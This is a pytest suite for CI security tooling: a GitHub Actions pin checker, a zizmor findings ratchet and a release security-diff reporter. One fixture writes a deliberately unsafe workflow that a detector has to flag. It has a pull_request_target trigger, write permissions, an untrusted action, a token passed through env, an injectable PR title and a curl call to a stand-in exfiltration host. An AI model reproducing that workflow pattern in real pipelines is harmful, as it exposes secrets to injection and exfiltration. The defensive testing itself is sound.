"""Tests for the workflow-security scripts: pin check, zizmor ratchet, release diff."""
from __future__ import annotations

import importlib.util
import json
import re
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SHA = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"


def load(name: str, filename: str):
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / filename)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


pins = load("check_pinned_uses", "check-pinned-uses.py")
ratchet = load("workflow_security_ratchet", "workflow-security-ratchet.py")
diff = load("release_security_diff", "release-security-diff.py")


# --- check-pinned-uses -------------------------------------------------------

@pytest.mark.parametrize("ref,ok", [
    (f"actions/checkout@{SHA}", True),
    (f"Manolii-org/ai-starter-pack/.github/workflows/ci-reusable.yml@{SHA}", True),
    ("./.github/workflows/local.yml", True),
    ("Manolii-org/ai-starter-pack/.github/workflows/ci-reusable.yml@v1.22.0", False),
    ("actions/checkout@v6", False),
    ("actions/checkout@main", False),
    ("actions/checkout", False),
    (f"actions/checkout@{SHA[:12]}", False),  # short SHA is still ambiguous
    ("docker://alpine:3.20", False),
    ("docker://alpine@sha256:" + "a" * 64, True),
])
def test_classify(ref, ok):
    assert (pins.classify(ref, []) is None) is ok


def test_scan_reports_line_and_skips_comments(tmp_path):
    wf = tmp_path / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    wf.write_text(
        "jobs:\n"
        "  a:\n"
        "    # uses: actions/checkout@v4  (commented out)\n"
        "    uses: org/repo/.github/workflows/x.yml@v1.2.3\n"
        "  b:\n"
        "    steps:\n"
        f"      - uses: actions/checkout@{SHA} # v6\n"
        "      - uses: 'actions/setup-node@v4'\n"
    )
    found = pins.scan_file(wf, [])
    assert [(line, ref) for line, ref, _ in found] == [
        (4, "org/repo/.github/workflows/x.yml@v1.2.3"),
        (8, "actions/setup-node@v4"),
    ]


def test_scan_covers_every_yaml_spelling(tmp_path):
    """Flow mappings and quoted keys are valid YAML that GitHub executes;
    a line regex missed both."""
    wf = tmp_path / "ci.yml"
    wf.write_text(
        "jobs:\n"
        "  a:\n"
        "    steps:\n"
        "      - {uses: actions/checkout@v6}\n"
        "      - \"uses\": actions/setup-python@v6\n"
        "      - uses: |-\n"
        "          actions/cache@v4\n"
        "      - uses: some/action@" + SHA + "\n"
        "        with:\n"
        "          uses: not-an-action@v1\n"  # an input value, not a reference
    )
    found = [(line, ref) for line, ref, _ in pins.scan_file(wf, [])]
    assert found == [
        (4, "actions/checkout@v6"),
        (5, "actions/setup-python@v6"),
        (6, "actions/cache@v4"),  # block scalar: reported at its `|-` line
    ]


def test_job_ids_named_like_data_keys_are_still_checked(tmp_path):
    """`env`/`with`/`inputs` are data keys inside a job or step, but directly
    under `jobs:` they are job IDs and their `uses:` must be checked."""
    wf = tmp_path / "ci.yml"
    wf.write_text(
        "env:\n  uses: not-an-action@v1\n"          # workflow-level env: data
        "jobs:\n"
        "  env:\n    uses: org/repo/.github/workflows/x.yml@v1\n"
        "  with:\n    steps:\n      - uses: actions/cache@v4\n"
    )
    refs = [ref for _, ref, _ in pins.scan_file(wf, [])]
    assert refs == ["org/repo/.github/workflows/x.yml@v1", "actions/cache@v4"]


def test_local_actions_outside_github_actions_are_followed(tmp_path):
    wf = tmp_path / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    wf.write_text("jobs:\n  a:\n    steps:\n      - uses: ./actions/build\n"
                  "      - uses: ./missing/dir\n")
    action = tmp_path / "actions" / "build" / "action.yml"
    action.parent.mkdir(parents=True)
    action.write_text("runs:\n  using: composite\n  steps:\n    - uses: actions/cache@v4\n")
    assert pins.main(["--root", str(tmp_path)]) == 1
    action.write_text("runs:\n  using: composite\n  steps:\n"
                      f"    - uses: actions/cache@{SHA}\n")
    assert pins.main(["--root", str(tmp_path)]) == 0


def test_unparseable_yaml_fails_closed(tmp_path):
    wf = tmp_path / "bad.yml"
    wf.write_text("jobs: [unclosed\n")
    assert pins.scan_file(wf, [])[0][1] == "<unparseable>"


def test_allow_ref_and_exit_codes(tmp_path):
    wf = tmp_path / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    wf.write_text("jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n")
    assert pins.main(["--root", str(tmp_path)]) == 1
    assert pins.main(["--root", str(tmp_path), "--allow-ref", r"actions/checkout@v4"]) == 0
    assert pins.main(["--root", str(tmp_path), "--allow-ref", "("]) == 2


def test_composite_actions_are_scanned(tmp_path):
    action = tmp_path / ".github" / "actions" / "x" / "action.yml"
    action.parent.mkdir(parents=True)
    action.write_text("runs:\n  using: composite\n  steps:\n    - uses: actions/cache@v4\n")
    assert action in pins.default_targets(tmp_path)
    assert pins.main(["--root", str(tmp_path)]) == 1


def test_pack_itself_is_fully_pinned():
    assert pins.main(["--root", str(ROOT)]) == 0


# --- workflow-security-ratchet ------------------------------------------------

def finding(ident="template-injection", path=".github/workflows/a.yml",
            feature="run: echo ${{ github.event.issue.title }}", row=10, ignored=False):
    return {
        "ident": ident,
        "ignored": ignored,
        "determinations": {"severity": "High"},
        "locations": [{
            "symbolic": {"key": {"Local": {"verbatim_path": path}},
                         "annotation": "may expand", "kind": "Primary"},
            "concrete": {"location": {"start_point": {"row": row}}, "feature": feature},
        }],
    }


def test_fingerprint_ignores_line_numbers_shas_and_version_comments():
    a = ratchet.fingerprint(finding(feature=f"uses: actions/checkout@{SHA} # v6", row=3))
    b = ratchet.fingerprint(finding(feature="uses:   actions/checkout@" + "1" * 40 + " # v6.0.1",
                                    row=99))
    assert a["fingerprint"] == b["fingerprint"]
    c = ratchet.fingerprint(finding(feature="uses: actions/cache@" + "1" * 40))
    assert c["fingerprint"] != a["fingerprint"]


def test_ratchet_new_gone_and_duplicates(tmp_path):
    baseline = tmp_path / "baseline.json"
    known = [finding(), finding()]  # same finding twice in one file
    zz = tmp_path / "zz.json"
    zz.write_text(json.dumps(known))
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline), "--write-baseline"]) == 0
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline)]) == 0

    # A third copy of an already-baselined finding is still new.
    zz.write_text(json.dumps(known + [finding()]))
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline)]) == 1

    # A fixed finding fails until the baseline is shrunk (burn-down only).
    zz.write_text(json.dumps(known[:1]))
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline)]) == 1

    # Ignored (zizmor: ignore) findings never count.
    zz.write_text(json.dumps(known + [finding(ident="artipacked", ignored=True)]))
    assert ratchet.main(["--input", str(zz), "--baseline", str(baseline)]) == 0


def test_scanner_errors_exit_2_not_drift_1(tmp_path):
    """Callers must tell 'scanner broken' (2) from 'baseline drift' (1)."""
    with pytest.raises(SystemExit) as missing:
        ratchet.run_zizmor(str(tmp_path / "no-such-zizmor"), ["."])
    assert missing.value.code == 2

    fake = tmp_path / "fake-zizmor"
    fake.write_text("#!/bin/sh\necho 'not json'\nexit 3\n")
    fake.chmod(0o755)
    with pytest.raises(SystemExit) as garbage:
        ratchet.run_zizmor(str(fake), ["."])
    assert garbage.value.code == 2


def test_committed_baseline_is_well_formed():
    data = json.loads((ROOT / "config" / "zizmor-baseline.json").read_text())
    # Burn-down target is zero findings, so an empty list is valid.
    assert isinstance(data["findings"], list)
    for e in data["findings"]:
        assert set(e) == {"fingerprint", "ident", "path", "severity"}
        assert len(e["fingerprint"]) == 16


# --- release-security-diff ----------------------------------------------------

def git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


def test_release_diff_reports_security_facts(tmp_path):
    repo = tmp_path / "r"
    wf = repo / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    git(tmp_path, "init", "-q", "r")
    git(repo, "config", "user.email", "t@example.com")
    git(repo, "config", "user.name", "t")
    wf.write_text(
        "on: pull_request\n"
        "permissions:\n  contents: read\n"
        "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
        f"      - uses: actions/checkout@{SHA}\n"
        "      - run: python3 -c 'secrets.append(1)'\n"
    )
    (repo / "README.md").write_text("x\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    wf.write_text(
        "on:\n  pull_request_target:\n"
        "permissions:\n  contents: write\n"
        "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
        f"      - uses: actions/checkout@{SHA}\n"
        "      - uses: evil/action@" + "2" * 40 + "\n"
        "      - env:\n          T: ${{ secrets.DEPLOY_TOKEN }}\n"
        "        run: |\n"
        "          echo \"${{ github.event.pull_request.title }}\"\n"
        "          curl -s https://exfil.example.net/x\n"
    )
    git(repo, "commit", "-qam", "head")

    text = diff.report(repo, "HEAD~1", "HEAD")
    assert "`pull_request_target`" in text
    assert "`workflow: contents=write`" in text
    assert "➕ `DEPLOY_TOKEN`" in text
    assert "append" not in text  # secrets.append(...) in a script is not a secret
    assert "evil/action@" in text
    assert "github.event.pull_request.title" in text
    assert "exfil.example.net" in text


@pytest.mark.parametrize("expr,flagged", [
    ("${{ github.event.issue.title }}", True),
    ("${{ toJSON(github.event.issue.title) }}", True),
    ("${{ format('{0}', inputs.command) }}", True),
    ("${{ github.head_ref }}", True),
    ("${{ github.event.pull_request.labels[0].name }}", True),
    ("${{\n  inputs.cmd\n}}", True),
    ("${{ github.sha }}", False),
    ("${{ steps.x.outputs.inputs }}", False),
    ("${{ matrix.inputs }}", False),
])
def test_run_expression_detection_covers_wrapped_references(expr, flagged):
    """Attacker-influenceable contexts are reported wherever they appear in an
    expression, not only as its first token."""
    doc = ("on: push\njobs:\n  a:\n    runs-on: x\n    steps:\n"
           "      - run: |\n          echo " + expr.replace("\n", "\n          ") + "\n")
    found = diff.facts(doc)["run_expressions"]
    assert bool(found) is flagged, (expr, found)


def test_release_diff_reports_trigger_configuration_changes(tmp_path):
    """Same event name, broader scope: widening pull_request_target branches
    must show up even though the trigger name is unchanged."""
    repo = tmp_path / "r"
    wf = repo / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    git(tmp_path, "init", "-q", "r")
    git(repo, "config", "user.email", "t@example.com")
    git(repo, "config", "user.name", "t")
    wf.write_text("on:\n  pull_request_target:\n    branches: [main]\n"
                  "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    wf.write_text(wf.read_text().replace("branches: [main]", "branches: ['**']"))
    git(repo, "commit", "-qam", "widen")
    text = diff.report(repo, "HEAD~1", "HEAD")
    assert '➕ `pull_request_target: {"branches": ["**"]}`' in text
    assert '➖ `pull_request_target: {"branches": ["main"]}`' in text


def test_release_diff_no_workflow_changes(tmp_path):
    repo = tmp_path / "r"
    repo.mkdir()
    git(tmp_path, "init", "-q", "r")
    git(repo, "config", "user.email", "t@example.com")
    git(repo, "config", "user.name", "t")
    (repo / "a.txt").write_text("1")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "1")
    (repo / "a.txt").write_text("2")
    git(repo, "commit", "-qam", "2")
    assert "No workflow or action files changed." in diff.report(repo, "HEAD~1", "HEAD")


# --- documented callers pin pack_ref -----------------------------------------

def _reusables_with_mutable_pack_ref_default() -> set[str]:
    """Reusables whose `pack_ref` input defaults to a tag/alias, not a SHA."""
    import yaml
    out = set()
    for wf in (ROOT / ".github" / "workflows").glob("*-reusable.yml"):
        doc = yaml.safe_load(wf.read_text())
        on = doc.get("on", doc.get(True)) or {}
        inputs = ((on.get("workflow_call") or {}).get("inputs") or {})
        default = (inputs.get("pack_ref") or {}).get("default")
        if default and not re.fullmatch(r"[0-9a-f]{40}", str(default)):
            out.add(wf.stem)
    return out


def test_documented_callers_pin_pack_ref_to_the_uses_sha():
    """Reusable pack_ref defaults follow the pinned workflow commit.

    A SHA-pinned uses: used to run mutable pack code when pack_ref defaulted
    to v1. Those four reusables now resolve an empty pack_ref to
    job.workflow_sha and fail closed when that is empty. Any reusable that
    still has a mutable default must keep documented callers pinned.
    """
    import re as _re
    mutable = _reusables_with_mutable_pack_ref_default()
    anchored = {
        "pr-assessment-reusable",
        "ui-smoke-reusable",
        "e2e-playwright-reusable",
        "integration-admission-reusable",
    }
    assert anchored.isdisjoint(mutable)
    for name in anchored:
        text = (ROOT / ".github" / "workflows" / f"{name}.yml").read_text()
        assert "default: v1" not in text
        assert "inputs.pack_ref || job.workflow_sha" in text
        assert "Could not resolve this workflow's own pack commit" in text
    # actionlint 1.31.1 does not model job.workflow_sha. The ignore is
    # per-file and only that message; dropping it fails the security job.
    actionlint = (ROOT / ".github" / "actionlint.yaml").read_text()
    for name in anchored:
        path = f".github/workflows/{name}.yml:"
        assert path in actionlint
        section = actionlint.split(path, 1)[1].split("\n  .github/", 1)[0]
        assert 'property "workflow_sha" is not defined' in section
    doc = (ROOT / ".github/workflows/REUSABLE-WORKFLOWS.md").read_text()
    blocks = _re.findall(r"```ya?ml\n(.*?)```", doc, flags=_re.S)
    checked = 0
    for block in blocks:
        for m in _re.finditer(
                r"uses: [Mm]anolii-org/ai-starter-pack/\.github/workflows/"
                r"([a-z0-9-]+)\.yml@([0-9a-f]{40})", block):
            name, sha = m.groups()
            if name not in mutable:
                continue
            checked += 1
            assert _re.search(rf"pack_ref:\s*['\"]?{sha}\b", block), (
                f"{name} example must set pack_ref: {sha}")
    assert mutable == set()
    assert checked == 0
